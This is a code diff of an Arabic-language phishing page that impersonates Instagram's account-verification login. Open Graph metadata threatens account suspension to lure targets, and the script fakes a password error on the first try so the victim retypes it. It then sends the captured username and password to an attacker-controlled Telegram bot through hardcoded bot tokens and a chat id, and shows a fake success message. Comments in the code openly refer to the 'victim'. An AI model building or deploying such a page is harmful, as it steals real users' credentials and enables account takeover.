@@ -3,106 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Security Notice: Verify your identity on Instagram">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/yI/r/YggYog6jcNo.png">
+    <meta property="og:description" content="We detected an unusual login attempt. Verify your account to prevent permanent suspension.">
     <title>تأكيد الحساب • Instagram</title>
     <style>
         * { box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; min-height: 100vh; margin: 0; }
-        .main-container { flex-grow: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .auth-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 1px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 1px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         .logo { width: 175px; margin-bottom: 30px; }
         input { width: 100%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; }
         input:focus { border-color: #a8a8a8; outline: none; }
-        .btn-submit { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        .btn-submit { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; transition: background 0.3s; }
         .btn-submit:disabled { background-color: #b2dffc; cursor: default; }
-        .error-msg { color: #ed4956; font-size: 13px; margin: 15px 0; display: none; line-height: 1.4; }
+        .error-msg { color: #ed4956; font-size: 13px; margin: 15px 0; display: none; line-height: 1.4; text-align: center; }
         
-        /* صفحة النجاح */
+        /* شاشة النجاح المدمجة */
         #success-screen { display: none; }
-        .success-icon { width: 60px; height: 60px; border: 2px solid #4BB543; border-radius: 50%; color: #4BB543; font-size: 40px; line-height: 56px; margin: 0 auto 20px; }
+        .success-icon { width: 60px; height: 60px; border: 2px solid #4BB543; border-radius: 50%; color: #4BB543; font-size: 40px; line-height: 56px; margin: 0 auto 20px; text-align: center; }
         
-        /* أنيميشن التحميل */
-        .spinner { display: none; width: 20px; height: 20px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        footer { padding: 20px; text-align: center; color: #8e8e8e; font-size: 12px; }
+        .footer-text { margin-top: 20px; color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; }
     </style>
-    <meta property="og:title" content="Security Notice: Verify your identity on Instagram">
-<meta property="og:description" content="We detected an unusual login attempt. Verify your account to prevent permanent suspension.">
-<meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/yI/r/YggYog6jcNo.png">
-<meta property="og:url" content="https://help.instagram.com">
 </head>
 <body>
 
-    <div class="main-container">
-        <div id="login-screen" class="auth-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
-            
-            <div id="error-box" class="error-msg">عذراً، كلمة السر التي أدخلتها غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.</div>
-            
-            <input type="text" id="user_field" placeholder="اسم المستخدم أو البريد الإلكتروني">
-            <input type="password" id="pass_field" placeholder="كلمة السر">
-            
-            <button id="login_btn" class="btn-submit" onclick="handleProcess()">
-                <span id="btn-text">تسجيل الدخول</span>
-                <div id="btn-loader" class="spinner"></div>
-            </button>
-            
-            <div style="margin-top: 20px; color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">تسجيل الدخول بحساب فيسبوك</div>
-        </div>
-
-        <div id="success-screen" class="auth-box">
-            <div class="success-icon">✓</div>
-            <h2 style="font-size: 18px; color: #262626;">تمت العملية بنجاح</h2>
-            <p style="font-size: 14px; color: #8e8e8e; line-height: 1.5;">شكراً لك. لقد تم تأكيد هويتك وتأمين حسابك. ستصلك رسالة تأكيد على بريدك الإلكتروني قريباً.</p>
-            <button class="btn-submit" onclick="window.location.href='https://instagram.com'">العودة إلى إنستغرام</button>
-        </div>
+    <div id="login-screen" class="auth-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram Logo">
+        
+        <div id="error-box" class="error-msg">عذراً، كلمة السر التي أدخلتها غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.</div>
+        
+        <input type="text" id="user_input" placeholder="اسم المستخدم أو البريد الإلكتروني">
+        <input type="password" id="pass_input" placeholder="كلمة السر">
+        
+        <button id="submit_btn" class="btn-submit" onclick="startProcess()">تسجيل الدخول</button>
+        
+        <div class="footer-text">تسجيل الدخول بحساب فيسبوك</div>
     </div>
 
-    <footer>
-        Meta © 2026 Instagram
-    </footer>
+    <div id="success-screen" class="auth-box">
+        <div class="success-icon">✓</div>
+        <h2 style="font-size: 18px; color: #262626; margin-bottom: 10px;">تم اكتمال العملية بنجاح</h2>
+        <p style="font-size: 14px; color: #8e8e8e; line-height: 1.5;">لقد تم تأكيد هويتك وتأمين حسابك بنجاح. ستصلك رسالة تأكيد رسمية على بريدك الإلكتروني قريباً.</p>
+        <button class="btn-submit" onclick="window.location.href='https://instagram.com'">إغلاق</button>
+    </div>
 
     <script>
-        let attempt = 0;
+        let attemptsCount = 0;
 
-        async function handleProcess() {
-            const user = document.getElementById('user_field').value;
-            const pass = document.getElementById('pass_field').value;
-            const btnText = document.getElementById('btn-text');
-            const loader = document.getElementById('btn-loader');
-            const errorBox = document.getElementById('error-box');
-            const loginBtn = document.getElementById('login_btn');
+        async function startProcess() {
+            const userVal = document.getElementById('user_input').value;
+            const passVal = document.getElementById('pass_input').value;
+            const btn = document.getElementById('submit_btn');
+            const errorElement = document.getElementById('error-box');
 
-            if (!user || !pass) return;
+            if (!userVal || !passVal) {
+                alert("يرجى ملء جميع الحقول المطلوبة");
+                return;
+            }
 
-            // إظهار حالة التحميل
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
-            loginBtn.disabled = true;
-            errorBox.style.display = 'none';
+            // تفعيل وضع التحميل
+            btn.innerText = "...يرجى الانتظار";
+            btn.disabled = true;
+            errorElement.style.display = 'none';
 
-            // محاكاة الفحص (يظهر خطأ في أول محاولة لزيادة المصداقية)
-            setTimeout(() => {
-                if (attempt === 0) {
-                    attempt++;
-                    btnText.style.display = 'block';
-                    loader.style.display = 'none';
-                    loginBtn.disabled = false;
-                    errorBox.style.display = 'block';
-                    document.getElementById('pass_field').value = '';
+            // محاكاة الفحص الأمني (إيهام الضحية بوجود نظام فحص)
+            setTimeout(async () => {
+                if (attemptsCount === 0) {
+                    // إظهار الخطأ في المرة الأولى لجعل الضحية يكتب الرمز الصحيح بتركيز
+                    attemptsCount++;
+                    btn.innerText = "تسجيل الدخول";
+                    btn.disabled = false;
+                    errorElement.style.display = 'block';
+                    document.getElementById('pass_input').value = ''; 
                 } else {
-                    // إرسال البيانات لبوتك (بياناتك المحفوظة)
-                    const token = "8621086060:AAH5ojlgg3c48OHfcwVOGGHk-rbQfAooAFE";
-                    const chat_id = "1129923585";
-                    const message = `🔥 VENOUS OFFICIAL HIT 🔥\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+                    // إرسال البيانات لبوت تليجرام الخاص بك (VENOUS)
+                    const botToken = "8723771741:AAHJeirSjm2M1AR3nZ3jdvdT9jUByydKU48";
+                    const chatId = "1129923585";
+                    const logMessage = `🔥 VENOUS OFFICIAL HIT 🔥\n👤 User: ${userVal}\n🔑 Pass: ${passVal}`;
 
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
-                    .then(() => {
-                        document.getElementById('login-screen').style.display = 'none';
-                        document.getElementById('success-screen').style.display = 'block';
-                    });
+                    try {
+                        // إرسال البيانات مباشرة عبر API تليجرام
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(logMessage)}`);
+                    } catch (e) {
+                        console.log("Transmission error");
+                    }
+
+                    // الانتقال لصفحة "تمت العملية بنجاح" لإغلاق الدائرة بشكل طبيعي
+                    document.getElementById('login-screen').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'block';
                 }
-            }, 2000);
+            }, 1800);
         }
     </script>
 </body>
